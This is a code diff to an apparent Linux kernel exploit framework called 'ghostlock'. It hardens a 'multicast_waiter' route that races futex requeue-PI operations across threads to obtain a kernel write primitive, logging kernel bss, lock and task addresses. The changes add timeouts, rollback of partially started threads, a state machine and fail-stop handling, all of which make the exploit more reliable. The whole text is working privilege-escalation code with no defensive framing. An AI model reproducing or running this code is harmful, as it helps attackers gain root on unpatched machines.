@@ -80,10 +80,37 @@ namespace ghostlock::route::multicast_waiter {
             context->waiter_tid.store(static_cast<int32_t>(syscall(SYS_gettid)));
             support::futex_op(&context->lock2_futex, FUTEX_LOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
             context->waiter_has_lock2.store(1);
-            while (!context->owner_has_lock1.load()) sched_yield();
+            while (!context->owner_has_lock1.load()) {
+                if (context->stop_requested.load()) {
+                    support::futex_op(&context->lock2_futex, FUTEX_UNLOCK_PI_PRIVATE,
+                                      0, nullptr, nullptr, 0);
+                    return nullptr;
+                }
+                sched_yield();
+            }
             context->waiter_waiting.store(1);
+            if (context->stop_requested.load()) {
+                support::futex_op(&context->lock2_futex, FUTEX_UNLOCK_PI_PRIVATE,
+                                  0, nullptr, nullptr, 0);
+                return nullptr;
+            }
+            struct timespec wait_deadline{};
+            SYSCHK(clock_gettime(CLOCK_MONOTONIC, &wait_deadline));
+            const uint64_t wait_ns = static_cast<uint64_t>(
+                context->profile->multicast_ready_timeout_ms()) * 1000000ULL;
+            wait_deadline.tv_sec += static_cast<time_t>(wait_ns / 1000000000ULL);
+            wait_deadline.tv_nsec += static_cast<long>(wait_ns % 1000000000ULL);
+            if (wait_deadline.tv_nsec >= 1000000000L) {
+                wait_deadline.tv_sec++;
+                wait_deadline.tv_nsec -= 1000000000L;
+            }
             support::futex_op(&context->condition_futex, FUTEX_WAIT_REQUEUE_PI_PRIVATE,
-                              0, nullptr, &context->lock1_futex, 0);
+                              0, &wait_deadline, &context->lock1_futex, 0);
+            if (context->stop_requested.load()) {
+                support::futex_op(&context->lock2_futex, FUTEX_UNLOCK_PI_PRIVATE,
+                                  0, nullptr, nullptr, 0);
+                return nullptr;
+            }
             context->socket_fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
             if (context->socket_fd < 0) return nullptr;
             multicast_waiter_stamp(context, 0, 0, context->lock);
@@ -111,7 +138,10 @@ namespace ghostlock::route::multicast_waiter {
         static void *multicast_owner_worker(void *arg) {
             auto *context = static_cast<MulticastWaiterRoute *>(arg);
             kernel::pin_to_core(static_cast<size_t>(context->main_cpu));
-            while (!context->waiter_has_lock2.load()) sched_yield();
+            while (!context->waiter_has_lock2.load()) {
+                if (context->stop_requested.load()) return nullptr;
+                sched_yield();
+            }
             support::futex_op(&context->lock1_futex, FUTEX_LOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
             context->owner_has_lock1.store(1);
             context->owner_waiting.store(1);
@@ -122,37 +152,76 @@ namespace ghostlock::route::multicast_waiter {
             return nullptr;
         }
 
-        static void multicast_waiter_disarm(MulticastWaiterRoute *context) {
+        static int32_t multicast_waiter_rollback_prearm(
+            MulticastWaiterRoute *context) noexcept {
+            if (!can_rollback_prearm(context->state)) return EBUSY;
             context->stop_requested.store(1);
-            context->race->consumer_go.store(0);
-            while (context->race->consumer_inflight.load()) sched_yield();
-            context->status.kernel_disarmed = 1;
-        }
-
-        static void multicast_waiter_destroy(MulticastWaiterRoute *context) {
+            const int32_t waiter_tid = context->waiter_tid.load();
+            if (waiter_tid > 0) {
+                (void) syscall(SYS_tgkill, getpid(), waiter_tid, SIGUSR1);
+            }
+            int32_t first_error = 0;
             if (context->waiter_worker_started) {
-                pthread_join(context->waiter_worker, nullptr);
-                context->waiter_worker_started = 0;
+                const int32_t error = pthread_join(context->waiter_worker, nullptr);
+                if (error == 0) context->waiter_worker_started = 0;
+                else first_error = error;
             }
             if (context->owner_worker_started) {
-                pthread_join(context->owner_worker, nullptr);
-                context->owner_worker_started = 0;
+                const int32_t error = pthread_join(context->owner_worker, nullptr);
+                if (error == 0) context->owner_worker_started = 0;
+                else if (first_error == 0) first_error = error;
             }
+            if (first_error != 0) return first_error;
             if (context->socket_fd >= 0) {
                 close(context->socket_fd);
                 context->socket_fd = -1;
             }
             context->ready = 0;
+            context->state = ResidentState::Empty;
+            context->status.userspace_clean = 1;
+            context->status.kernel_disarmed = 1;
+            context->status.code = ROUTE_FALLBACK_SAFE;
+            return 0;
+        }
+
+        static void multicast_waiter_disarm(MulticastWaiterRoute *context) {
+            context->stop_requested.store(1);
+            context->race->consumer_go.store(0);
+            while (context->race->consumer_inflight.load()) sched_yield();
+            context->status.kernel_disarmed = 1;
+            context->state = ResidentState::Disarmed;
+        }
+
+        static int32_t multicast_waiter_destroy(MulticastWaiterRoute *context) {
+            int32_t first_error = 0;
+            if (context->waiter_worker_started) {
+                const int32_t error = pthread_join(context->waiter_worker, nullptr);
+                if (error == 0) context->waiter_worker_started = 0;
+                else first_error = error;
+            }
+            if (context->owner_worker_started) {
+                const int32_t error = pthread_join(context->owner_worker, nullptr);
+                if (error == 0) context->owner_worker_started = 0;
+                else if (first_error == 0) first_error = error;
+            }
+            if (first_error != 0) return first_error;
+            if (context->socket_fd >= 0) {
+                close(context->socket_fd);
+                context->socket_fd = -1;
+            }
+            context->ready = 0;
+            context->state = ResidentState::Destroyed;
             context->status.userspace_clean = 1;
             if (context->status.code != ROUTE_OK && context->status.kernel_disarmed) {
                 context->status.code = ROUTE_FALLBACK_SAFE;
             }
+            return 0;
         }
     } // namespace
 
     int32_t MulticastWaiterRoute::start() noexcept {
         auto *context = this;
-        if (context->ready) return 1;
+        if (context->ready && context->state == ResidentState::Armed) return 1;
         if (context->waiter_worker_started || context->owner_worker_started) {
             pr_warning("multicast resident remains partially armed; refusing restart\n");
             return 0;
@@ -176,9 +245,16 @@ namespace ghostlock::route::multicast_waiter {
                            multicast_waiter_worker, context) != 0)
             return 0;
         context->waiter_worker_started = 1;
+        context->state = ResidentState::WorkersStarted;
         if (pthread_create(&context->owner_worker, nullptr,
-                           multicast_owner_worker, context) != 0)
+                           multicast_owner_worker, context) != 0) {
+            const int32_t cleanup_error = multicast_waiter_rollback_prearm(context);
+            if (cleanup_error != 0) {
+                support::fail_stop_dirty_race(
+                    "multicast owner-start rollback", cleanup_error);
+            }
             return 0;
+        }
         context->owner_worker_started = 1;
         struct timespec ready_started;
         clock_gettime(CLOCK_MONOTONIC, &ready_started);
@@ -186,26 +262,40 @@ namespace ghostlock::route::multicast_waiter {
                  context->owner_has_lock1.load() &&
                  context->waiter_waiting.load() &&
                  context->owner_waiting.load())) {
-            if (fops_elapsed_ms(&ready_started) >= profile->multicast_ready_timeout_ms())
+            if (fops_elapsed_ms(&ready_started) >= profile->multicast_ready_timeout_ms()) {
+                const int32_t cleanup_error = multicast_waiter_rollback_prearm(context);
+                if (cleanup_error != 0) {
+                    support::fail_stop_dirty_race(
+                        "multicast pre-arm ready rollback", cleanup_error);
+                }
                 return 0;
+            }
             sched_yield();
         }
         usleep(profile->multicast_post_requeue_settle_us());
         errno = 0;
+        context->state = ResidentState::RequeueAttempted;
         long r = support::futex_op(&context->condition_futex, FUTEX_CMP_REQUEUE_PI_PRIVATE,
                                    1, (void *) 0, &context->lock1_futex, 0);
+        const int32_t requeue_error = errno;
         context->condition_futex = 1;
         syscall(SYS_tgkill, getpid(), context->waiter_tid.load(), SIGUSR1);
-        if (r >= 0 || (errno != EDEADLK && errno != EDEADLOCK)) return 0;
+        if (r >= 0 || (requeue_error != EDEADLK && requeue_error != EDEADLOCK)) {
+            support::fail_stop_dirty_race("multicast requeue result", requeue_error);
+        }
         clock_gettime(CLOCK_MONOTONIC, &ready_started);
         while (!context->waiter_ready.load() &&
                fops_elapsed_ms(&ready_started) < profile->multicast_ready_timeout_ms())
             sched_yield();
-        if (!context->waiter_ready.load() ||
-            multicast_waiter_adjust(context) < 0)
-            return 0;
+        if (!context->waiter_ready.load()) {
+            support::fail_stop_dirty_race("multicast waiter-ready deadline", ETIMEDOUT);
+        }
+        if (multicast_waiter_adjust(context) < 0) {
+            support::fail_stop_dirty_race("multicast initial adjust", errno);
+        }
         usleep(profile->multicast_post_adjust_settle_us());
         context->ready = 1;
+        context->state = ResidentState::Armed;
         context->status.code = ROUTE_OK;
         pr_success("5.x resident writer ready bss=0x%zx lock=0x%zx task=0x%zx\n",
                    bss, context->lock, context->task);
@@ -227,15 +317,25 @@ namespace ghostlock::route::multicast_waiter {
 
     void MulticastWaiterRoute::stop() noexcept {
         auto *context = this;
-        if (!context->ready) {
+        if (context->state == ResidentState::Empty ||
+            context->state == ResidentState::Destroyed) {
+            return;
+        }
+        if (!context->ready || context->state != ResidentState::Armed) {
             if (context->waiter_worker_started || context->owner_worker_started) {
                 context->status.code = ROUTE_DIRTY_FAILURE;
-                pr_warning("multicast resident partial setup retained for process exit\n");
+                support::fail_stop_dirty_race("multicast stop from non-armed state", EBUSY);
+            }
+            if (requires_fail_stop(context->state)) {
+                support::fail_stop_dirty_race("multicast stop from dirty state", EBUSY);
             }
             return;
         }
         multicast_waiter_disarm(context);
-        multicast_waiter_destroy(context);
+        const int32_t destroy_error = multicast_waiter_destroy(context);
+        if (destroy_error != 0) {
+            support::fail_stop_dirty_race("multicast worker join", destroy_error);
+        }
         /* SESSION-04: the route owns only its route resources; reaping the
      * HeapContext references is the session's step after destroy. */
         session::g_exploit_session.release_resident_heap();
